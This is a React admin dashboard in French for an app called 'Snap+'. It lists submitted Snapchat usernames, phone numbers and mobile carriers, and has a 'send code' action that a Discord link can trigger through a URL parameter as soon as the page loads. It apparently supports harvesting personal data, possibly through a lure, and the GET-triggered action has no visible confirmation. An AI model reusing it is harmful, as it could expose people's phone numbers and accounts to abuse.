import { useQuery, useQueryClient } from "@tanstack/react-query";
import { base44 } from "@/api/base44Client";
import { motion } from "framer-motion";
import { useEffect, useState } from "react";

const operatorBadge = {
  SFR: "bg-red-500/15 text-red-400 border-red-500/30",
  Bouygues: "bg-blue-500/15 text-blue-400 border-blue-500/30",
  Orange: "bg-orange-400/15 text-orange-400 border-orange-400/30",
};

export default function Admin() {
  const queryClient = useQueryClient();
  const [sendingId, setSendingId] = useState(null);
  const [sentIds, setSentIds] = useState([]);

  const { data: submissions = [], isLoading } = useQuery({
    queryKey: ["submissions"],
    queryFn: () => base44.entities.Submission.list("-created_date", 200),
  });

  // Handle ?action=send_code&id=... from Discord link
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get("action") === "send_code") {
      const id = params.get("id");
      if (id) handleSendCode(id);
    }
  }, []);

  const handleSendCode = async (id) => {
    setSendingId(id);
    await base44.functions.invoke("sendCode", { submissionId: id });
    setSentIds((prev) => [...prev, id]);
    setSendingId(null);
    queryClient.invalidateQueries(["submissions"]);
  };

  const stats = {
    total: submissions.length,
    SFR: submissions.filter((s) => s.operateur === "SFR").length,
    Bouygues: submissions.filter((s) => s.operateur === "Bouygues").length,
    Orange: submissions.filter((s) => s.operateur === "Orange").length,
  };

  return (
    <div className="min-h-screen bg-background px-4 py-10">
      <div className="max-w-4xl mx-auto">
        {/* Header */}
        <div className="mb-10">
          <h1 className="font-heading text-3xl font-bold text-foreground">
            Admin <span className="text-primary">Snap+</span>
          </h1>
          <p className="text-muted-foreground text-sm mt-1">
            Toutes les soumissions reçues
          </p>
        </div>

        {/* Stats */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-10">
          {[
            { label: "Total", value: stats.total, color: "text-primary" },
            { label: "SFR", value: stats.SFR, color: "text-red-400" },
            { label: "Bouygues", value: stats.Bouygues, color: "text-blue-400" },
            { label: "Orange", value: stats.Orange, color: "text-orange-400" },
          ].map((stat, i) => (
            <motion.div
              key={stat.label}
              initial={{ opacity: 0, y: 16 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: i * 0.07 }}
              className="bg-card border border-border rounded-xl p-5 text-center"
            >
              <div className={`font-heading text-3xl font-bold ${stat.color}`}>
                {stat.value}
              </div>
              <div className="text-muted-foreground text-xs mt-1 font-medium uppercase tracking-wide">
                {stat.label}
              </div>
            </motion.div>
          ))}
        </div>

        {/* Table */}
        <div className="bg-card border border-border rounded-2xl overflow-hidden shadow-xl shadow-black/30">
          {isLoading ? (
            <div className="flex items-center justify-center py-20">
              <div className="w-8 h-8 border-2 border-primary/30 border-t-primary rounded-full animate-spin" />
            </div>
          ) : submissions.length === 0 ? (
            <div className="text-center py-20">
              <span className="text-5xl block mb-4">👻</span>
              <p className="text-muted-foreground">Aucune soumission pour l'instant</p>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead>
                  <tr className="border-b border-border bg-muted/50">
                    <th className="text-left px-6 py-4 text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                      #
                    </th>
                    <th className="text-left px-6 py-4 text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                      Snapchat
                    </th>
                    <th className="text-left px-6 py-4 text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                      Téléphone
                    </th>
                    <th className="text-left px-6 py-4 text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                      Opérateur
                    </th>
                    <th className="text-left px-6 py-4 text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                      Date
                    </th>
                    <th className="text-left px-6 py-4 text-xs font-semibold uppercase tracking-wider text-muted-foreground">
                      Action
                    </th>
                    </tr>
                    </thead>
                    <tbody>
                    {submissions.map((sub, i) => {
                    const isSent = sentIds.includes(sub.id) || sub.status === "code_ready";
                    const isSending = sendingId === sub.id;
                    return (
                    <motion.tr
                      key={sub.id}
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      transition={{ delay: i * 0.03 }}
                      className="border-b border-border/50 hover:bg-muted/30 transition-colors"
                    >
                      <td className="px-6 py-4 text-muted-foreground text-sm font-mono">
                        {i + 1}
                      </td>
                      <td className="px-6 py-4 text-sm font-semibold text-foreground flex items-center gap-2">
                        <span className="text-base">👻</span> {sub.snapchat}
                      </td>
                      <td className="px-6 py-4 text-sm text-foreground font-mono">
                        {sub.telephone}
                      </td>
                      <td className="px-6 py-4">
                        <span
                          className={`inline-flex items-center px-3 py-1 rounded-full border text-xs font-bold tracking-wide ${operatorBadge[sub.operateur]}`}
                        >
                          {sub.operateur}
                        </span>
                      </td>
                      <td className="px-6 py-4 text-xs text-muted-foreground">
                        {new Date(sub.created_date).toLocaleDateString("fr-FR", {
                          day: "2-digit",
                          month: "short",
                          year: "numeric",
                          hour: "2-digit",
                          minute: "2-digit",
                        })}
                      </td>
                      <td className="px-6 py-4">
                        {isSent ? (
                          <span className="text-green-400 text-xs font-semibold">✅ Code envoyé</span>
                        ) : (
                          <button
                            onClick={() => handleSendCode(sub.id)}
                            disabled={isSending}
                            className="bg-primary text-primary-foreground text-xs font-bold px-4 py-2 rounded-lg hover:bg-primary/80 transition-colors disabled:opacity-50"
                          >
                            {isSending ? "Envoi..." : "📤 Envoyer le code"}
                          </button>
                        )}
                      </td>
                    </motion.tr>
                    );
                    })}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}